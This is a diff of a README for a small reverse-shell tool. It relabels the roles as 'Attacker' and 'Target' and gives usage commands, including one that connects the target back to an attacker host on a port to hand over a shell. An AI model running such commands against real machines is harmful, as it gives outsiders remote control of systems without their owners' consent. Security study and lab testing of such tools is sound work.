@@ -1,8 +1,8 @@
 # reverseShell
 This is a program in which a 
-**server** (or the attacker)
+**Attacker** 
 gains a shell of
-**client** (or the victim)
+**Target** 
 to which it is connected to.
 
 ## Usage
@@ -10,14 +10,14 @@ to which it is connected to.
 On your machine setup a server and start listening on a port.
 
 ``` 
-./server 8080 
+./attacker 8080 
 ```
 
 ### 2. Execute client script and setup a connection to the server
-You can do this by simply executing the client compiled file
+You can do this by simply executing the target compiled file
 
 ```
-./client 192.168.0.2 8080
+./target 192.168.0.2 8080
 ```
 
 Now you should have a prompt on server machine.
